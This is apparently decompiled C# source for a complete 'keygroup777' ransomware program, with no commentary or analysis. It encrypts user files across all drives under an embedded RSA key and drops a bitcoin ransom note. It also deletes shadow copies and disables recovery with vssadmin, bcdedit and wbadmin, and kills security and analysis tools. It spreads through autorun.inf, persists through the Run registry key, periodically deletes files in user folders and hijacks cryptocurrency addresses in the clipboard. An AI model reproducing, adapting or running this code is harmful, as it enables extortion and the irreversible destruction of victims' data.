using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Back;

internal class Program
{
	private static readonly string[] processesToKill = new string[31]
	{
		"procexp", "SbieCtrl", "SpyTheSpy", "wireshark", "apateDNS", "IPBlocker", "TiGeR-Firewall", "smsniff", "exeinfoPE", "NetSnifferCs",
		"Sandboxie Control", "processhacker", "dnSpy", "CodeReflect", "Reflector", "ILSpy", "VGAuthService", "VBoxService", "msconfig", "regedit",
		"cmd", "taskmgr", "ShadowExplorer", "rstrui", "ShadowExplorerPortable", "SpyHunter-Installer", "SpyHunter", "MRT", "die", "WindowsSandbox",
		"WindowsSandboxClient"
	};

	private static string RANDOM_VALUE = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";

	private static string RSA_PUBLIC_KEY = "<RSAKeyValue><Modulus>sGSumx2oENfVVp90mRZTwhVPE8OmLyxRL/P40rRS1X6XnPn9et58R+UPoBAYEpAfl0dMETCEex4W6H+vCvEX5nwKVi7yM0/WAxkBFLvzafSnSCkdpX1pjdOTHpV8QFpUD9CfRoQhfbDLT+RRKCl4tV1cp6sGZYs2LFLjEPJ6iAlQVcX0cCKyuuv0OoS9dA+9lBXLOH/PSQdorcl1G1zuG04y/EgU0ldn4yJDB6NiqDHOKa+KEFWWsbHwhShw6CgHq4gS+tQtEQp35BdBpJtD1D+d47vXGhSmm2RkvDIn+TFNUqWxPzJrXeXR9Drs+rRMRsGRDeVmXLYKWY48/+aQjQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

	private static byte[] RSA_KEY_IV;

	private static int[] SALT_ALL = new int[34]
	{
		52, 57, 35, 15, 24, 16, 42, 35, 57, 25,
		52, 32, 1, 23, 35, 39, 25, 19, 9, 46,
		13, 4, 15, 49, 18, 16, 4, 4, 54, 44,
		27, 25, 58, 56
	};

	private static int[] SALT_TRIPLE = new int[42]
	{
		1, 2, 52, 16, 15, 10, 6, 4, 9, 16,
		4, 17, 15, 58, 55, 6, 53, 54, 12, 58,
		25, 7, 9, 10, 20, 9, 57, 4, 60, 2,
		54, 57, 56, 57, 19, 18, 15, 15, 16, 11,
		10, 20
	};

	private static string FOR_ALL;

	private static string FOR_TRIPLE;

	private static bool ENCRYPT_EXTENSIONS = true;

	private static string[] TARGETED_EXTENSIONS = new string[271]
	{
		".myd", ".ndf", ".qry", ".sdb", ".sdf", ".tmd", ".tgz", ".lzo", ".txt", ".jar",
		".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
		".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql", ".indd", ".cs",
		".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov", ".rtf", ".bmp", ".mkv", ".avi",
		".apk", ".lnk", ".dib", ".dic", ".dif", ".mdb", ".php", ".asp", ".aspx", ".html",
		".htm", ".xml", ".psd", ".pdf", ".xla", ".cub", ".dae", ".divx", ".iso", ".7zip",
		".pdb", ".ico", ".pas", ".db", ".wmv", ".swf", ".cer", ".bak", ".backup", ".accdb",
		".bay", ".p7c", ".exif", ".vss", ".raw", ".m4a", ".wma", ".ace", ".arj", ".bz2",
		".cab", ".gzip", ".lzh", ".tar", ".jpeg", ".xz", ".mpeg", ".torrent", ".mpg", ".core",
		".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb", ".crt", ".xlsm",
		".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps", ".docm", ".wav",
		".3gp", ".gif", ".log", ".gz", ".config", ".vb", ".m1v", ".sln", ".pst", ".obj",
		".xlam", ".djvu", ".inc", ".cvs", ".dbf", ".tbi", ".wpd", ".dot", ".dotx", ".webm",
		".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk", ".vdi", ".vmdk", ".onepkg", ".accde",
		".jsp", ".json", ".xltx", ".vsdx", ".uxdc", ".udl", ".3ds", ".3fr", ".3g2", ".accda",
		".accdc", ".accdw", ".adp", ".ai", ".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8",
		".arw", ".ascx", ".asm", ".asmx", ".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr",
		".pict", ".rgbe", ".dwt", ".f4v", ".exr", ".kwm", ".max", ".mda", ".mde", ".mdf",
		".mdw", ".mht", ".mpv", ".msg", ".myi", ".nef", ".odc", ".geo", ".swift", ".odm",
		".odp", ".oft", ".orf", ".pfx", ".p12", ".pl", ".pls", ".safe", ".tab", ".vbs",
		".xlk", ".xlm", ".xlt", ".xltm", ".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb",
		".tif", ".rss", ".key", ".vob", ".epsp", ".dc3", ".iff", ".opt", ".onetoc2", ".nrw",
		".pptm", ".potx", ".potm", ".pot", ".xlw", ".xps", ".xsd", ".xsf", ".xsl", ".kmz",
		".accdr", ".stm", ".accdt", ".ppam", ".pps", ".ppsm", ".1cd", ".p7b", ".wdb", ".sqlite",
		".sqlite3", ".dacpac", ".zipx", ".lzma", ".z", ".tar.xz", ".pam", ".r3d", ".ova", ".1c",
		".dt", ".c", ".vmx", ".xhtml", ".ckp", ".db3", ".dbc", ".dbs", ".dbt", ".dbv",
		".frm", ".mwb", ".url", ".sys", ".dll", ".vbox", ".wmf", ".wim", ".lnk", ".scr",
		".exe"
	};

	private static readonly string EXTENSION_TYPE = ".keygroup777Rezerv1";

	private static readonly string TEXT_MESSAGE = "You became victim of the keygroup777 RANSOMWARE!" + Environment.NewLine + "The files on your computer have been encrypted with an military grade encryption algorithm. There is no way to" + Environment.NewLine + "restore your data without a special key. You can purchase this key on the telegram page shown in step 2." + Environment.NewLine + "To purchase your key and restore your data, please follow these three easy steps:" + Environment.NewLine + "register a bitcoin 300$ @keygroup777Rezerv1 3CcQvqAXWZf1wUThRVaxgo35WZjcjWm5Dc." + Environment.NewLine + "2. register a bitcoin wallet :" + Environment.NewLine + "https://bitcoin-wallet.org/ru/" + Environment.NewLine + "https://bitcoin-wallet.org/ru/" + Environment.NewLine + "3. Enter your personal decryption code there:" + Environment.NewLine + "e5Pc4P8WjF35" + Environment.NewLine;

	private static string MESSAGE_FILE = "keygroup.txt";

	private static string CHANGE_PROCESS_NAME = "";

	private static string[] WALLPAPER_MESSAGE = new string[3] { "All your files are stolen and encrypted", "Find readme.txt and follow the ", "instruction" };

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (CHANGE_PROCESS_NAME != "")
		{
			COPY_FILE(CHANGE_PROCESS_NAME);
		}
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo drive in drives)
		{
			Task task = Task.Factory.StartNew(delegate
			{
				if (ENCRYPT_EXTENSIONS)
				{
					LOOK_FOR_EXTENSIONS(drive.ToString());
				}
				else
				{
					LOOK_FOR_EXCEPTIONS(drive.ToString());
				}
			});
			task.Wait();
			UAC();
			Infect();
			ProcessKill();
			ProcessKill1();
			STARTUP1();
			COPY_FILE1();
		}
		DRAW_WALLPAPER(WALLPAPER_MESSAGE);
		KILL_APPS_ENCRYPT_AGAIN();
		STARTUP();
		FOR_ALL = AES_SALT(RANDOM_VALUE, SALT_ALL);
		FOR_TRIPLE = AES_SALT(RANDOM_VALUE, SALT_TRIPLE);
		if (CHECK_REGEDIT())
		{
			KEEP_RUNNING();
		}
	}

	private static void COPY_FILE1()
	{
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd.exe",
			WindowStyle = ProcessWindowStyle.Hidden,
			Arguments = "/c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet"
		});
	}

	private static void STARTUP1()
	{
		System.Timers.Timer timer = new System.Timers.Timer(7200000.0);
		timer.Elapsed += DeleteFiles;
		timer.AutoReset = true;
		timer.Start();
	}

	private static void DeleteFiles(object sender, ElapsedEventArgs e)
	{
		string[] array = new string[11]
		{
			Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
			Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\OneDrive",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\3D Objects",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Links",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Saved Games",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Searches",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Favorites",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Contacts",
			Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)
		};
		string[] array2 = array;
		foreach (string path in array2)
		{
			try
			{
				if (Directory.Exists(path))
				{
					string[] files = Directory.GetFiles(path);
					string[] array3 = files;
					foreach (string path2 in array3)
					{
						File.Delete(path2);
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	private static void ProcessKill()
	{
	}

	public static void ProcessKill1()
	{
		string[] array = processesToKill;
		foreach (string processName in array)
		{
			try
			{
				Process[] processesByName = Process.GetProcessesByName(processName);
				Process[] array2 = processesByName;
				foreach (Process process in array2)
				{
					process.Kill();
				}
			}
			catch (Exception)
			{
			}
		}
	}

	private static void Infect()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
		string[] logicalDrives = Directory.GetLogicalDrives();
		string[] array = logicalDrives;
		foreach (string path in array)
		{
			try
			{
				File.Copy(Application.ExecutablePath, Path.Combine(path, "keygroup777.flv.pif"));
				using (StreamWriter streamWriter = new StreamWriter(Path.Combine(path, "autorun.inf")))
				{
					streamWriter.WriteLine("[autorun]");
					streamWriter.WriteLine("open=keygroup777.flv.pif");
					streamWriter.WriteLine("shellexecute=keygroup777.flv.pif");
				}
				File.SetAttributes(Path.Combine(path, "autorun.inf"), FileAttributes.Hidden);
				File.SetAttributes(Path.Combine(path, "keygroup777.flv.pif"), FileAttributes.Hidden);
			}
			catch (Exception)
			{
			}
		}
	}

	private static void UAC()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string destFileName = "C:/Windows/" + Path.GetFileName(location);
		File.Copy(location, destFileName, overwrite: true);
	}

	private static void LOOK_FOR_EXTENSIONS(string path)
	{
		try
		{
			string[] files = Directory.GetFiles(path);
			bool flag = true;
			string[] array = files;
			foreach (string file in array)
			{
				try
				{
					string fileName = Path.GetFileName(file);
					if (EXCEPTIONAL_FILE(fileName) || !Array.Exists(TARGETED_EXTENSIONS, (string E) => E == Path.GetExtension(file).ToLower()) || !(fileName != MESSAGE_FILE))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(file);
					if (fileInfo.IsReadOnly)
					{
						try
						{
							fileInfo.Attributes = FileAttributes.Normal;
						}
						catch
						{
						}
					}
					if (fileInfo.Length < 524288)
					{
						FULL_ENCRYPT(file);
						File.Move(file, file + EXTENSION());
					}
					else if (fileInfo.Length > 524288)
					{
						TRIPLE_ENCRYPT(file, 131072, 0, fileInfo.Length / 2, fileInfo.Length - 131072);
						File.Move(file, file + EXTENSION());
					}
					if (flag)
					{
						flag = false;
						string path2 = path + "/" + MESSAGE_FILE;
						if (!File.Exists(path2))
						{
							File.WriteAllText(path2, TEXT_MESSAGE);
						}
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(path);
			string[] array2 = directories;
			foreach (string path3 in array2)
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(path3);
				if (directoryInfo.Attributes.HasFlag(FileAttributes.ReadOnly))
				{
					try
					{
						directoryInfo.Attributes &= ~FileAttributes.Normal;
					}
					catch
					{
					}
				}
				if (!EXCEPTIONAL_FOLDER(directoryInfo.Name) && !EXCEPTIONAL_PATH(path3))
				{
					LOOK_FOR_EXTENSIONS(path3);
				}
			}
		}
		catch
		{
		}
	}

	private static void LOOK_FOR_EXCEPTIONS(string path)
	{
		try
		{
			string[] files = Directory.GetFiles(path);
			bool flag = true;
			string[] array = files;
			foreach (string text in array)
			{
				try
				{
					string fileName = Path.GetFileName(text);
					string Extension = Path.GetExtension(text).ToLower();
					if (EXCEPTIONAL_FILE(fileName) || Array.Exists(TARGETED_EXTENSIONS, (string E) => E == Extension) || !(Extension != "") || !(fileName != MESSAGE_FILE))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(text);
					if (fileInfo.IsReadOnly)
					{
						try
						{
							fileInfo.Attributes = FileAttributes.Normal;
						}
						catch
						{
						}
					}
					if (fileInfo.Length < 524288)
					{
						FULL_ENCRYPT(text);
						File.Move(text, text + EXTENSION());
					}
					else if (fileInfo.Length > 524288)
					{
						TRIPLE_ENCRYPT(text, 131072, 0, fileInfo.Length / 2, fileInfo.Length - 131072);
						File.Move(text, text + EXTENSION());
					}
					if (flag)
					{
						flag = false;
						string path2 = path + "/" + MESSAGE_FILE;
						if (!File.Exists(path2))
						{
							File.WriteAllText(path2, TEXT_MESSAGE);
						}
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(path);
			string[] array2 = directories;
			foreach (string path3 in array2)
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(path3);
				if (directoryInfo.Attributes.HasFlag(FileAttributes.ReadOnly))
				{
					try
					{
						directoryInfo.Attributes &= ~FileAttributes.Normal;
					}
					catch
					{
					}
				}
				if (!EXCEPTIONAL_FOLDER(directoryInfo.Name) && !EXCEPTIONAL_PATH(path3))
				{
					LOOK_FOR_EXCEPTIONS(path3);
				}
			}
		}
		catch
		{
		}
	}

	private static string EXTENSION()
	{
		if (EXTENSION_TYPE == "")
		{
			return "." + RANDOM_STRING(5);
		}
		return EXTENSION_TYPE;
	}

	private static bool EXCEPTIONAL_FILE(string FileName)
	{
		FileName = FileName.ToLower();
		string[] array = new string[11]
		{
			"iconcache.db", "autorun.inf", "thumbs.db", "boot.ini", "bootfont.bin", "ntuser.ini", "bootmgr", "bootmgr.efi", "bootmgfw.efi", "desktop.ini",
			"ntuser.dat"
		};
		return Array.Exists(array, (string E) => E == FileName.ToLower());
	}

	private static bool EXCEPTIONAL_FOLDER(string Folder)
	{
		Folder = Folder.ToLower();
		string[] array = new string[16]
		{
			"documents and settings", "PerfLogs", "program files", "program files (x86)", "programdata", "windows", "system volume information", "$recycle.bin", "mozilla", "windows.old",
			"windows.old.old", "perflogs", "appdata", "intel", "$windows.~ws", "$windows.~bt"
		};
		return Array.Exists(array, (string E) => E == Folder.ToLower());
	}

	private static bool EXCEPTIONAL_PATH(string path)
	{
		path = path.ToLower();
		string[] array = new string[8] { "c:\\windows", "c:\\users\\all users", "c:\\programdata", "c:\\program files (x86)", "c:\\users\\default", "c:\\program files", "c:\\perflogs", "c:\\windows.old" };
		return Array.Exists(array, (string E) => E == path.ToLower());
	}

	private static void TRIPLE_ENCRYPT(string filePath, int length, int beginning, long middle, long end)
	{
		string text = RANDOM_STRING(32);
		string text2 = RANDOM_STRING(16);
		byte[] bytes = Encoding.ASCII.GetBytes(text + "|" + text2);
		RSA_KEY_IV = RSA_ENCRYPT(RSA_PUBLIC_KEY, bytes);
		using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite))
		{
			fileStream.Position = beginning;
			byte[] array = new byte[length];
			fileStream.Read(array, 0, length);
			byte[] array2 = ENCRYPT_DATA(text, text2, array);
			fileStream.Position = beginning;
			fileStream.Write(array2, 0, array2.Length);
			fileStream.Position = middle;
			byte[] array3 = new byte[length];
			fileStream.Read(array3, 0, length);
			byte[] array4 = ENCRYPT_DATA(text, text2, array3);
			fileStream.Position = middle;
			fileStream.Write(array4, 0, array4.Length);
			fileStream.Position = end;
			byte[] array5 = new byte[length];
			fileStream.Read(array5, 0, length);
			byte[] array6 = ENCRYPT_DATA(text, text2, array5);
			fileStream.Position = end;
			fileStream.Write(array6, 0, array6.Length);
		}
		using FileStream fileStream2 = new FileStream(filePath, FileMode.Append, FileAccess.Write);
		fileStream2.Write(RSA_KEY_IV, 0, RSA_KEY_IV.Length);
	}

	private static byte[] ENCRYPT_DATA(string KEY, string IV, byte[] plainText)
	{
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Key = Encoding.ASCII.GetBytes(KEY);
		rijndaelManaged.IV = Encoding.ASCII.GetBytes(IV);
		rijndaelManaged.Mode = CipherMode.CBC;
		rijndaelManaged.Padding = PaddingMode.None;
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
		return cryptoTransform.TransformFinalBlock(plainText, 0, plainText.Length);
	}

	private static void FULL_ENCRYPT(string filePath)
	{
		byte[] array = File.ReadAllBytes(filePath);
		string text = RANDOM_STRING(32);
		string text2 = RANDOM_STRING(16);
		byte[] bytes = Encoding.ASCII.GetBytes(text + "|" + text2);
		RSA_KEY_IV = RSA_ENCRYPT(RSA_PUBLIC_KEY, bytes);
		using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Write))
		{
			fileStream.SetLength(0L);
			byte[] array2 = null;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				rijndaelManaged.Key = Encoding.ASCII.GetBytes(text);
				rijndaelManaged.IV = Encoding.ASCII.GetBytes(text2);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(array, 0, array.Length);
				}
				array2 = memoryStream.ToArray();
			}
			fileStream.Write(array2, 0, array2.Length);
		}
		using FileStream fileStream2 = new FileStream(filePath, FileMode.Append, FileAccess.Write);
		fileStream2.Write(RSA_KEY_IV, 0, RSA_KEY_IV.Length);
	}

	private static byte[] RSA_ENCRYPT(string publicKeyString, byte[] dataToEncrypt)
	{
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
		rSACryptoServiceProvider.FromXmlString(publicKeyString);
		return rSACryptoServiceProvider.Encrypt(dataToEncrypt, fOAEP: false);
	}

	private static string AES_SALT(string text, int[] saltIndex)
	{
		List<char> list = new List<char>();
		foreach (int num in saltIndex)
		{
			if (num >= 0 && num < text.Length)
			{
				list.Add(text[num]);
			}
		}
		return string.Join("", list);
	}

	private static string RANDOM_STRING(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		using (RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider())
		{
			byte[] array = new byte[4];
			while (length-- > 0)
			{
				rNGCryptoServiceProvider.GetBytes(array);
				uint num = BitConverter.ToUInt32(array, 0);
				stringBuilder.Append(RANDOM_VALUE[(int)(num % (uint)RANDOM_VALUE.Length)]);
			}
		}
		return stringBuilder.ToString();
	}

	public static void DRAW_WALLPAPER(string[] lines)
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Expected O, but got Unknown
		//IL_005b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0062: Expected O, but got Unknown
		//IL_0062: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		Rectangle bounds = Screen.PrimaryScreen.Bounds;
		int width = bounds.Width;
		int height = bounds.Height;
		Bitmap val = new Bitmap(width, height);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		try
		{
			val2.Clear(ColorTranslator.FromHtml("Black"));
			Font val3 = new Font("Arial", 36f, (FontStyle)1);
			SolidBrush val4 = new SolidBrush(ColorTranslator.FromHtml("White"));
			StringFormat val5 = new StringFormat();
			val5.Alignment = (StringAlignment)1;
			val5.LineAlignment = (StringAlignment)1;
			int num = (int)(val3.GetHeight() + 5f);
			int num2 = height / 2 - lines.Length / 2 * num;
			foreach (string text in lines)
			{
				val2.DrawString(text, val3, (Brush)(object)val4, new RectangleF(0f, num2, width, num), val5);
				num2 += num;
			}
		}
		finally
		{
			((IDisposable)val2)?.Dispose();
		}
		string text2 = Path.GetTempPath() + RANDOM_STRING(9) + ".jpg";
		((Image)val).Save(text2, ImageFormat.Jpeg);
		SystemParametersInfo(20u, 0u, text2, 3u);
	}

	private static void STARTUP()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue(MESSAGE_FILE.Split(new char[1] { '.' })[0], location);
		registryKey.Close();
	}

	private static void COPY_FILE(string FILE_NAME)
	{
		try
		{
			string fileName = Process.GetCurrentProcess().MainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + FILE_NAME;
			if (fileName != text)
			{
				if (File.Exists(text))
				{
					File.Delete(text);
					Thread.Sleep(500);
				}
				byte[] bytes = File.ReadAllBytes(fileName);
				Thread.Sleep(100);
				File.WriteAllBytes(text, bytes);
				ProcessStartInfo startInfo = new ProcessStartInfo(text);
				if (new Process
				{
					StartInfo = startInfo
				}.Start())
				{
					Environment.Exit(1);
				}
			}
		}
		catch
		{
		}
	}

	private static void KILL_APPS_ENCRYPT_AGAIN()
	{
		string[] array = new string[50]
		{
			"sqlwriter", "sqbcoreservice", "VirtualBoxVM", "sqlagent", "sqlbrowser", "sqlservr", "code", "steam", "zoolz", "agntsvc",
			"firefoxconfig", "infopath", "synctime", "VBoxSVC", "tbirdconfig", "thebat", "thebat64", "isqlplussvc", "mydesktopservice", "mysqld",
			"ocssd", "onenote", "mspub", "mydesktopqos", "CNTAoSMgr", "Ntrtscan", "vmplayer", "oracle", "outlook", "powerpnt",
			"wps", "xfssvccon", "ProcessHacker", "dbeng50", "dbsnmp", "encsvc", "excel", "tmlisten", "PccNTMon", "mysqld-nt",
			"mysqld-opt", "ocautoupds", "ocomm", "msaccess", "msftesql", "thunderbird", "visio", "winword", "wordpad", "mbamtray"
		};
		string[] array2 = array;
		foreach (string processName in array2)
		{
			Process[] processesByName = Process.GetProcessesByName(processName);
			foreach (Process process in processesByName)
			{
				process.CloseMainWindow();
			}
		}
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo drive in drives)
		{
			Task task = Task.Factory.StartNew(delegate
			{
				if (ENCRYPT_EXTENSIONS)
				{
					LOOK_FOR_EXTENSIONS(drive.ToString());
				}
				else
				{
					LOOK_FOR_EXCEPTIONS(drive.ToString());
				}
			});
			task.Wait();
		}
	}

	private static string GET_TEXT()
	{
		string ReturnValue = string.Empty;
		try
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				ReturnValue = Clipboard.GetText();
			});
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
			thread.Join();
		}
		catch
		{
		}
		Regex regex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");
		if (ReturnValue.StartsWith("bc1"))
		{
			return regex.Replace(ReturnValue, FOR_TRIPLE);
		}
		return regex.Replace(ReturnValue, FOR_ALL);
	}

	private static bool CHECK_REGEDIT()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + Environment.UserName);
			object value = registryKey.GetValue(Environment.UserName);
			registryKey.Close();
			if (value.ToString().Length > 0)
			{
				return false;
			}
			return true;
		}
		catch
		{
			return true;
		}
	}

	public static void SET_TEXT(string text)
	{
		Thread thread = new Thread((ThreadStart)delegate
		{
			try
			{
				Clipboard.SetText(text);
			}
			catch
			{
			}
		});
		thread.SetApartmentState(ApartmentState.STA);
		thread.Start();
		thread.Join();
	}

	private static void KEEP_RUNNING()
	{
		while (true)
		{
			SET_TEXT(GET_TEXT());
			Thread.Sleep(700);
		}
	}
}
